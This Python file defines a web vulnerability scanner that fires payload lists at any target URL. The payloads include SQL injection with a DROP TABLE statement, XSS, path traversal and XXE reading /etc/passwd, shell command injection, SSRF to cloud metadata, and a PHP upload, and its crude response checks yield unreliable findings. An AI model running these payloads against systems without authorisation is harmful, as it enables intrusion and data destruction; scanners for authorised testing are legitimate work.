#!/usr/bin/env python3
import re
import time
import random
from urllib.parse import urlparse, urljoin, parse_qs, quote
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.logger import logger
from core.config import Config
from core.utils import validate_url

class WebScanner:
    def __init__(self, config=None):
        self.config = config or Config()
        self.ua = UserAgent()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.results = []
        self.vuln_count = 0
        self.found_urls = set()
        self.forms = []
        self.cookies = []
        self.timeout = 30
    
    def scan(self, target):
        """Main scan method - 20+ vulnerabilities"""
        target = validate_url(target)
        logger.info(f"Starting web scan on {target}")
        
        results = {
            'target': target,
            'vulnerabilities': [],
            'info': {},
            'headers': {},
            'cookies': [],
            'forms': [],
            'links': [],
            'directories': []
        }
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'
        ]
        
        resp = None
        
        for ua in user_agents:
            try:
                self.session.headers.update({'User-Agent': ua})
                logger.info(f"Trying with User-Agent: {ua[:50]}...")
                resp = self.session.get(target, timeout=self.timeout, verify=False)
                if resp.status_code < 500:
                    logger.info(f"Connected successfully with status: {resp.status_code}")
                    break
            except requests.exceptions.Timeout:
                logger.warning(f"Timeout with this User-Agent, trying next...")
                continue
            except Exception as e:
                logger.warning(f"Error with this User-Agent: {e}")
                continue
        
        if resp is None:
            if target.startswith('https://'):
                http_target = target.replace('https://', 'http://')
                logger.info(f"Retrying with HTTP: {http_target}")
                for ua in user_agents[:2]:
                    try:
                        self.session.headers.update({'User-Agent': ua})
                        resp = self.session.get(http_target, timeout=self.timeout, verify=False)
                        if resp.status_code < 500:
                            logger.info(f"Connected via HTTP with status: {resp.status_code}")
                            results['target'] = http_target
                            break
                    except:
                        continue
            
            if resp is None:
                logger.error(f"Failed to connect to {target} after all attempts")
                return results
        
        try:
            results['headers'] = dict(resp.headers)
            results['cookies'] = self._get_cookie_info(resp.cookies)
            results['info']['technologies'] = self._detect_technologies(resp.text, resp.headers)
            results['info']['status_code'] = resp.status_code
            results['info']['content_length'] = len(resp.text)
            
            self.forms = self._extract_forms(resp.text, target)
            results['forms'] = self.forms
            results['links'] = self._extract_links(resp.text, target)
            
        except Exception as e:
            logger.error(f"Error processing response: {e}")
            return results
        
        vulnerabilities = []
        
        
        logger.info("[1/20] Testing SQL Injection...")
        vulns = self._scan_sqli(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[2/20] Testing XSS...")
        vulns = self._scan_xss(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[3/20] Testing LFI...")
        vulns = self._scan_lfi(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[4/20] Testing RFI...")
        vulns = self._scan_rfi(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[5/20] Testing Command Injection...")
        vulns = self._scan_command_injection(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[6/20] Testing Open Redirect...")
        vulns = self._scan_open_redirect(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[7/20] Checking CSRF Protection...")
        vulns = self._scan_csrf(target, resp)
        vulnerabilities.extend(vulns)
        
        logger.info("[8/20] Checking Information Disclosure...")
        vulns = self._scan_info_disclosure(target, resp)
        vulnerabilities.extend(vulns)
        
        logger.info("[9/20] Checking Security Headers...")
        vulns = self._check_security_headers(resp.headers)
        vulnerabilities.extend(vulns)
        
        logger.info("[10/20] Bruteforcing Directories...")
        dirs = self._scan_directories(target)
        if dirs:
            results['directories'] = dirs
        
        logger.info("[11/20] Scanning Backup Files...")
        vulns = self._scan_backup_files(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[12/20] Looking for Admin Panels...")
        vulns = self._scan_admin_panels(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[13/20] Checking Cookie Security...")
        vulns = self._check_cookie_security(resp.cookies)
        vulnerabilities.extend(vulns)
        
        if 'mongodb' in str(results['info']['technologies']).lower():
            logger.info("[14/20] Testing NoSQL Injection...")
            vulns = self._scan_nosql(target)
            vulnerabilities.extend(vulns)
        
        logger.info("[15/20] Testing SSTI...")
        vulns = self._scan_ssti(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[16/20] Testing XXE...")
        vulns = self._scan_xxe(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[17/20] Testing SSRF...")
        vulns = self._scan_ssrf(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[18/20] Testing LDAP Injection...")
        vulns = self._scan_ldap(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[19/20] Testing File Upload...")
        vulns = self._scan_file_upload(target)
        vulnerabilities.extend(vulns)
        
        logger.info("[20/20] Testing Host Header Injection...")
        vulns = self._scan_host_header(target)
        vulnerabilities.extend(vulns)
        
        results['vulnerabilities'] = vulnerabilities
        self.results = results
        self.vuln_count = len(vulnerabilities)
        
        logger.info(f"Scan complete! Found {self.vuln_count} vulnerabilities")
        return results
    
    
    def _detect_technologies(self, text, headers):
        tech = []
        indicators = {
            'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
            'Joomla': ['joomla', 'com_content'],
            'Drupal': ['drupal', 'sites/all'],
            'Laravel': ['laravel', 'csrf-token'],
            'Django': ['django', 'csrftoken'],
            'Ruby on Rails': ['rails', 'authenticity_token'],
            'ASP.NET': ['__viewstate', '__eventvalidation'],
            'PHP': ['.php', 'PHPSESSID'],
            'Node.js': ['express', 'x-powered-by: express'],
            'React': ['react', 'react-dom'],
            'Angular': ['angular', 'ng-'],
            'Vue.js': ['vue', 'v-'],
            'Bootstrap': ['bootstrap', 'col-md-'],
            'jQuery': ['jquery', '$(']
        }
        for name, indicators_list in indicators.items():
            for indicator in indicators_list:
                if indicator in text.lower() or indicator in str(headers).lower():
                    tech.append(name)
                    break
        return list(set(tech))
    
    def _get_cookie_info(self, cookies):
        info = []
        for cookie in cookies:
            info.append({
                'name': cookie.name,
                'secure': cookie.secure,
                'httponly': cookie.has_nonstandard_attr('HttpOnly'),
                'path': cookie.path,
                'domain': cookie.domain
            })
        return info
    
    def _extract_forms(self, html, base_url):
        forms = []
        soup = BeautifulSoup(html, 'html.parser')
        for form in soup.find_all('form'):
            form_data = {
                'action': urljoin(base_url, form.get('action', '')),
                'method': form.get('method', 'get').upper(),
                'inputs': []
            }
            for inp in form.find_all('input'):
                input_data = {
                    'name': inp.get('name', ''),
                    'type': inp.get('type', 'text'),
                    'value': inp.get('value', '')
                }
                form_data['inputs'].append(input_data)
            for textarea in form.find_all('textarea'):
                input_data = {
                    'name': textarea.get('name', ''),
                    'type': 'textarea',
                    'value': ''
                }
                form_data['inputs'].append(input_data)
            forms.append(form_data)
        return forms
    
    def _extract_links(self, html, base_url):
        links = []
        soup = BeautifulSoup(html, 'html.parser')
        for link in soup.find_all('a'):
            href = link.get('href', '')
            if href:
                full_url = urljoin(base_url, href)
                if full_url.startswith(('http://', 'https://')):
                    links.append(full_url)
        return list(set(links))[:50]
    
    def _test_form(self, url, form, payload, param_name=None):
        try:
            data = {}
            for inp in form['inputs']:
                if inp['type'] in ['text', 'search', 'textarea', '']:
                    if param_name and inp['name'] == param_name:
                        data[inp['name']] = payload
                    else:
                        data[inp['name']] = inp.get('value', 'test')
                elif inp['type'] == 'hidden':
                    data[inp['name']] = inp.get('value', '')
            
            if form['method'] == 'GET':
                resp = self.session.get(form['action'], params=data, timeout=10, verify=False)
            else:
                resp = self.session.post(form['action'], data=data, timeout=10, verify=False)
            
            return resp
        except:
            return None
    
    
    def _scan_sqli(self, url):
        found = []
        payloads = [
            ("' OR '1'='1", "Classic OR"),
            ("' OR 1=1--", "OR Bypass"),
            ("' AND SLEEP(5)--", "Time Based"),
            ("' UNION SELECT NULL--", "Union Based"),
            ("'; DROP TABLE users--", "Stacked Query"),
            ("' OR '1'='1' /*", "Comment Bypass"),
            ("' OR 1=1#", "Hash Bypass"),
            ("' AND 1=1--", "Boolean Based"),
            ("' AND 1=2--", "Boolean Based 2"),
            ("' OR 1=1 AND '1'='1", "Complex OR")
        ]
        
        parsed = urlparse(url)
        
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads[:5]:
                    test_params = parse_qs(parsed.query)
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{requests.compat.urlencode(test_params, doseq=True)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if self._check_sqli_response(resp.text):
                            found.append({
                                'type': 'SQL Injection',
                                'severity': 'Critical',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param,
                                'url': test_url[:100] + '...'
                            })
                            break
                    except:
                        pass
        
        for form in self.forms:
            for inp in form['inputs']:
                if inp['type'] in ['text', 'search', 'textarea', '']:
                    for payload, name in payloads[:5]:
                        resp = self._test_form(url, form, payload, inp['name'])
                        if resp and self._check_sqli_response(resp.text):
                            found.append({
                                'type': 'SQL Injection (Form)',
                                'severity': 'Critical',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': inp['name'],
                                'form': form['action']
                            })
                            break
                    break
        
        return found
    
    def _check_sqli_response(self, text):
        patterns = [
            r'SQL syntax.*MySQL', r'Warning.*mysql_', r'MySQLSyntaxErrorException',
            r'valid MySQL result', r'PostgreSQL.*ERROR', r'Warning.*\Wpg_',
            r'SQLite/JDBCDriver', r'ORA-[0-9]{5}', r'mssql_query',
            r'SQL Server', r'division by zero', r'unclosed quotation mark',
            r'you have an error in your sql', r'mysql_fetch',
            r'Microsoft OLE DB', r'Microsoft Access', r'DB2 SQL Error'
        ]
        return any(re.search(p, text, re.IGNORECASE) for p in patterns)
    
    def _scan_xss(self, url):
        found = []
        payloads = [
            ('<script>alert("XSS")</script>', 'Basic Script'),
            ('<img src=x onerror=alert("XSS")>', 'Image Error'),
            ('javascript:alert("XSS")', 'JavaScript URI'),
            ('"><script>alert("XSS")</script>', 'Tag Injection'),
            ('<svg onload=alert("XSS")>', 'SVG Injection'),
            ('<body onload=alert("XSS")>', 'Body Onload'),
            ('<scr<script>ipt>alert("XSS")</scr</script>ipt>', 'Bypass Filter'),
            ('" onmouseover=alert("XSS") "', 'Event Handler'),
            ('<iframe src=javascript:alert("XSS")>', 'Iframe Attack'),
            ('<a href=javascript:alert("XSS")>click</a>', 'Link Attack')
        ]
        
        parsed = urlparse(url)
        
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads[:5]:
                    test_params = parse_qs(parsed.query)
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{requests.compat.urlencode(test_params, doseq=True)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if self._check_xss_response(resp.text, payload):
                            found.append({
                                'type': 'XSS (Reflected)',
                                'severity': 'High',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param,
                                'url': test_url[:100] + '...'
                            })
                            break
                    except:
                        pass
        
        for form in self.forms:
            for inp in form['inputs']:
                if inp['type'] in ['text', 'search', 'textarea', '']:
                    for payload, name in payloads[:3]:
                        resp = self._test_form(url, form, payload, inp['name'])
                        if resp and self._check_xss_response(resp.text, payload):
                            found.append({
                                'type': 'XSS (Stored)',
                                'severity': 'High',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': inp['name'],
                                'form': form['action']
                            })
                            break
                    break
        
        return found
    
    def _check_xss_response(self, text, payload):
        clean = payload.strip()
        if clean in text:
            return True
        encoded = [clean.replace('"', '&quot;'), clean.replace('<', '&lt;'), clean.replace('>', '&gt;')]
        for e in encoded:
            if e in text:
                return True
        return False
    
    def _scan_lfi(self, url):
        found = []
        payloads = [
            ('../../../etc/passwd', 'Unix Passwd'),
            ('..\\..\\..\\windows\\win.ini', 'Windows Win.ini'),
            ('../../../../boot.ini', 'Windows Boot.ini'),
            ('/etc/passwd', 'Root Passwd'),
            ('/proc/self/environ', 'Proc Environ'),
            ('../../../../../../../../etc/passwd', 'Deep Passwd'),
            ('..\\..\\..\\..\\..\\..\\windows\\win.ini', 'Deep Windows')
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads:
                    test_params = parse_qs(parsed.query)
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{requests.compat.urlencode(test_params, doseq=True)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if self._check_lfi_response(resp.text):
                            found.append({
                                'type': 'LFI',
                                'severity': 'High',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param
                            })
                            break
                    except:
                        pass
        
        return found
    
    def _check_lfi_response(self, text):
        patterns = [
            r'root:x:0:0', r'boot.ini', r'\[boot loader\]',
            r'APACHE_DOCUMENT_ROOT', r'MYSQL_DATABASE', r'DB_NAME',
            r'<?php', r'<?xml', r'Microsoft Windows', r'File not found'
        ]
        return any(re.search(p, text, re.IGNORECASE) for p in patterns)
    
    def _scan_rfi(self, url):
        found = []
        payloads = [
            ('https://pastebin.com/raw/test', 'Pastebin'),
            ('http://google.com/robots.txt', 'Google Robots'),
            ('https://raw.githubusercontent.com/test/test', 'Github'),
            ('http://example.com/test.txt', 'Example')
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads:
                    test_params = parse_qs(parsed.query)
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{requests.compat.urlencode(test_params, doseq=True)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if self._check_rfi_response(resp.text):
                            found.append({
                                'type': 'RFI',
                                'severity': 'High',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param
                            })
                            break
                    except:
                        pass
        
        return found
    
    def _check_rfi_response(self, text):
        patterns = [r'User-agent', r'pastebin', r'raw.githubusercontent', r'example\.com', r'google\.com']
        return any(re.search(p, text, re.IGNORECASE) for p in patterns)
    
    def _scan_command_injection(self, url):
        found = []
        payloads = [
            ('; ls', 'Unix List'),
            ('| dir', 'Windows Dir'),
            ('&& whoami', 'Whoami'),
            ('| cat /etc/passwd', 'Cat Passwd'),
            ('; pwd', 'Unix PWD'),
            ('| echo test', 'Echo Test')
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads:
                    test_params = parse_qs(parsed.query)
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{requests.compat.urlencode(test_params, doseq=True)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if self._check_command_response(resp.text):
                            found.append({
                                'type': 'Command Injection',
                                'severity': 'Critical',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param
                            })
                            break
                    except:
                        pass
        
        return found
    
    def _check_command_response(self, text):
        patterns = [r'root:', r'bin:', r'uid=', r'gid=', r'groups=', r'test', r'Desktop', r'Documents']
        return any(re.search(p, text, re.IGNORECASE) for p in patterns)
    
    def _scan_open_redirect(self, url):
        found = []
        payloads = [
            ('//google.com', 'Double Slash'),
            ('https://google.com', 'HTTPS'),
            ('http://google.com', 'HTTP'),
            ('///google.com', 'Triple Slash'),
            ('/\\google.com', 'Backslash')
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads:
                    test_params = parse_qs(parsed.query)
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{requests.compat.urlencode(test_params, doseq=True)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False, allow_redirects=False)
                        if resp.status_code in [301, 302, 303, 307] and 'google.com' in resp.headers.get('Location', ''):
                            found.append({
                                'type': 'Open Redirect',
                                'severity': 'Medium',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param
                            })
                            break
                    except:
                        pass
        
        return found
    
    def _scan_csrf(self, url, resp):
        found = []
        tokens_found = False
        csrf_patterns = ['csrf', 'token', 'nonce', '_token', 'authenticity_token', 'request_verification_token']
        
        for form in self.forms:
            for inp in form['inputs']:
                if inp['name']:
                    if any(p in inp['name'].lower() for p in csrf_patterns):
                        tokens_found = True
                        break
        
        if not tokens_found and self.forms:
            found.append({
                'type': 'Missing CSRF Protection',
                'severity': 'Medium',
                'details': f'No anti-CSRF tokens found in {len(self.forms)} forms'
            })
        
        return found
    
    def _scan_info_disclosure(self, url, resp):
        found = []
        server = resp.headers.get('Server', '')
        if server:
            found.append({
                'type': 'Server Information Disclosure',
                'severity': 'Low',
                'details': f'Server: {server}'
            })
        
        x_powered = resp.headers.get('X-Powered-By', '')
        if x_powered:
            found.append({
                'type': 'Technology Information Disclosure',
                'severity': 'Low',
                'details': f'X-Powered-By: {x_powered}'
            })
        
        test_urls = [url + '/nonexistent.php', url + '/test.asp', url + '/wrong', url + '/404page']
        for test_url in test_urls:
            try:
                resp2 = self.session.get(test_url, timeout=10, verify=False)
                if 'error' in resp2.text.lower() or 'warning' in resp2.text.lower():
                    if 'not found' not in resp2.text.lower():
                        found.append({
                            'type': 'Error Page Information Disclosure',
                            'severity': 'Medium',
                            'details': f'Error page at {test_url}'
                        })
                        break
            except:
                pass
        
        return found
    
    def _check_security_headers(self, headers):
        found = []
        required = [
            ('X-Frame-Options', 'Clickjacking protection - missing'),
            ('X-Content-Type-Options', 'MIME sniffing protection - missing'),
            ('X-XSS-Protection', 'XSS protection - missing'),
            ('Content-Security-Policy', 'CSP policy - missing'),
            ('Strict-Transport-Security', 'HSTS policy - missing'),
            ('Referrer-Policy', 'Referrer policy - missing')
        ]
        for header, desc in required:
            if header not in headers:
                found.append({
                    'type': 'Missing Security Header',
                    'severity': 'Medium',
                    'details': f'{header} - {desc}'
                })
        return found
    
    def _scan_directories(self, url):
        found = []
        wordlist = [
            'admin', 'login', 'wp-admin', 'administrator', 'admin.php',
            'uploads', 'images', 'files', 'media', 'download',
            'backup', 'temp', 'logs', 'debug', 'cache',
            'config', 'settings', 'conf', 'cfg', 'env',
            '.git', '.env', '.htaccess', '.htpasswd', '.gitignore',
            'test', 'dev', 'stage', 'qa', 'prod', 'staging',
            'api', 'rest', 'graphql', 'swagger', 'docs',
            'static', 'assets', 'public', 'www', 'html',
            'phpmyadmin', 'mysql', 'adminer', 'phpinfo'
        ]
        
        for directory in wordlist:
            test_url = urljoin(url, directory + '/')
            try:
                resp = self.session.get(test_url, timeout=5, verify=False)
                if resp.status_code == 200:
                    found.append(directory)
                    logger.info(f"  Found directory: {directory}/")
            except:
                pass
        
        return found
    
    def _scan_backup_files(self, url):
        found = []
        extensions = ['.bak', '.backup', '.old', '.swp', '.tmp', '.sql', '.tar', '.zip', '.gz', '.7z', '.rar']
        common_files = ['index.php', 'config.php', 'wp-config.php', '.htaccess', 'settings.php', 'db.php']
        
        for file in common_files:
            for ext in extensions:
                test_url = urljoin(url, file + ext)
                try:
                    resp = self.session.head(test_url, timeout=5, verify=False)
                    if resp.status_code == 200:
                        found.append({
                            'type': 'Backup File Exposure',
                            'severity': 'High',
                            'details': f'Backup file exposed: {file + ext}'
                        })
                        break
                except:
                    pass
        
        return found
    
    def _scan_admin_panels(self, url):
        found = []
        admin_paths = [
            'admin', 'administrator', 'wp-admin', 'wp-admin/index.php',
            'admin/index.php', 'login', 'login.php', 'user/login',
            'auth/login', 'signin', 'dashboard', 'panel',
            'control', 'manage', 'administration', 'cp',
            'cpanel', 'webmail', 'phpmyadmin', 'mysql',
            'adminer', 'phpinfo.php', 'info.php'
        ]
        
        for path in admin_paths:
            test_url = urljoin(url, path)
            try:
                resp = self.session.get(test_url, timeout=5, verify=False)
                if resp.status_code == 200:
                    found.append({
                        'type': 'Admin Panel Detection',
                        'severity': 'Critical',
                        'details': f'Admin panel found: {test_url}'
                    })
                    break
            except:
                pass
        
        return found
    
    def _check_cookie_security(self, cookies):
        found = []
        for cookie in cookies:
            if not cookie.secure:
                found.append({
                    'type': 'Insecure Cookie',
                    'severity': 'Medium',
                    'details': f"Cookie '{cookie.name}' missing Secure flag"
                })
            if not cookie.has_nonstandard_attr('HttpOnly'):
                found.append({
                    'type': 'Insecure Cookie',
                    'severity': 'Medium',
                    'details': f"Cookie '{cookie.name}' missing HttpOnly flag"
                })
            if not cookie.has_nonstandard_attr('SameSite'):
                found.append({
                    'type': 'Insecure Cookie',
                    'severity': 'Low',
                    'details': f"Cookie '{cookie.name}' missing SameSite flag"
                })
        return found
    
    def _scan_nosql(self, url):
        found = []
        payloads = [
            ("{'$gt': ''}", "MongoDB Greater Than"),
            ("{'$ne': ''}", "MongoDB Not Equal"),
            ("{'$regex': '.*'}", "MongoDB Regex"),
            ("{'_id': {'$ne': null}}", "MongoDB ID Bypass"),
            ("{'$or': [{'username':'admin'}, {'password':'admin'}]}", "MongoDB OR Injection")
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads:
                    try:
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{param}={quote(payload)}"
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if 'error' in resp.text.lower() or 'exception' in resp.text.lower():
                            found.append({
                                'type': 'NoSQL Injection',
                                'severity': 'High',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param
                            })
                            break
                    except:
                        pass
        
        return found
    
    def _scan_ssti(self, url):
        found = []
        payloads = [
            ('{{7*7}}', 'Jinja2/Flask'),
            ('${7*7}', 'FreeMarker/Velocity'),
            ('{{7*7}}', 'Twig'),
            ('#set($x=7*7)', 'Velocity'),
            ('<%= 7*7 %>', 'ERB'),
            ('{{7*7}}', 'Jinja2')
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads[:4]:
                    test_params = parse_qs(parsed.query)
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{requests.compat.urlencode(test_params, doseq=True)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if '49' in resp.text:
                            found.append({
                                'type': 'SSTI',
                                'severity': 'Critical',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param
                            })
                            break
                    except:
                        pass
        
        return found
    
    def _scan_xxe(self, url):
        found = []
        try:
            xml_payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
            headers = {'Content-Type': 'application/xml'}
            resp = self.session.post(url, data=xml_payload, headers=headers, timeout=10, verify=False)
            if 'root:x:0:0' in resp.text:
                found.append({
                    'type': 'XXE (XML External Entity)',
                    'severity': 'Critical',
                    'details': 'XXE vulnerability detected with file:///etc/passwd'
                })
        except:
            pass
        
        return found
    
    def _scan_ssrf(self, url):
        found = []
        payloads = [
            ('http://localhost:80', 'Localhost'),
            ('http://127.0.0.1:80', '127.0.0.1'),
            ('http://[::1]:80', 'IPv6 Localhost'),
            ('http://169.254.169.254/latest/meta-data/', 'AWS Metadata')
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads[:2]:
                    test_params = parse_qs(parsed.query)
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{requests.compat.urlencode(test_params, doseq=True)}"
                    try:
                        resp = self.session.get(test_url, timeout=5, verify=False)
                        if 'localhost' in resp.text.lower() or '127.0.0.1' in resp.text:
                            found.append({
                                'type': 'SSRF (Server-Side Request Forgery)',
                                'severity': 'High',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param
                            })
                            break
                    except:
                        pass
        
        return found
    
    def _scan_ldap(self, url):
        found = []
        payloads = [
            ('*)(uid=*', 'Wildcard Injection'),
            ('*)(|(uid=*', 'OR Injection'),
            ('admin*', 'Admin Bypass'),
            (')(uid=*)(|(uid=*', 'Complex Injection')
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                for payload, name in payloads:
                    test_params = parse_qs(parsed.query)
                    test_params[param] = [payload]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{requests.compat.urlencode(test_params, doseq=True)}"
                    try:
                        resp = self.session.get(test_url, timeout=10, verify=False)
                        if 'uid=' in resp.text.lower() or 'cn=' in resp.text.lower():
                            found.append({
                                'type': 'LDAP Injection',
                                'severity': 'High',
                                'payload': payload,
                                'payload_name': name,
                                'parameter': param
                            })
                            break
                    except:
                        pass
        
        return found
    
    def _scan_file_upload(self, url):
        found = []
        for form in self.forms:
            has_file_input = False
            for inp in form['inputs']:
                if inp['type'] == 'file':
                    has_file_input = True
                    break
            
            if has_file_input:
                try:
                    files = {'file': ('malicious.php', '<?php phpinfo(); ?>', 'application/x-php')}
                    resp = self.session.post(form['action'], files=files, timeout=10, verify=False)
                    if 'phpinfo' in resp.text:
                        found.append({
                            'type': 'File Upload Bypass',
                            'severity': 'Critical',
                            'details': f'PHP file uploaded successfully to {form["action"]}'
                        })
                except:
                    pass
        
        return found
    
    def _scan_host_header(self, url):
        found = []
        test_hosts = ['evil.com', 'localhost', '127.0.0.1', 'malicious.com']
        
        for test_host in test_hosts:
            try:
                headers = {'Host': test_host}
                resp = self.session.get(url, headers=headers, timeout=10, verify=False)
                if test_host in resp.text.lower() or 'host' in resp.text.lower():
                    found.append({
                        'type': 'Host Header Injection',
                        'severity': 'Medium',
                        'details': f'Host header injection detected with: {test_host}'
                    })
                    break
            except:
                pass
        
        return found
    
    def get_results(self):
        return self.results
    
    def get_vuln_count(self):
        return self.vuln_count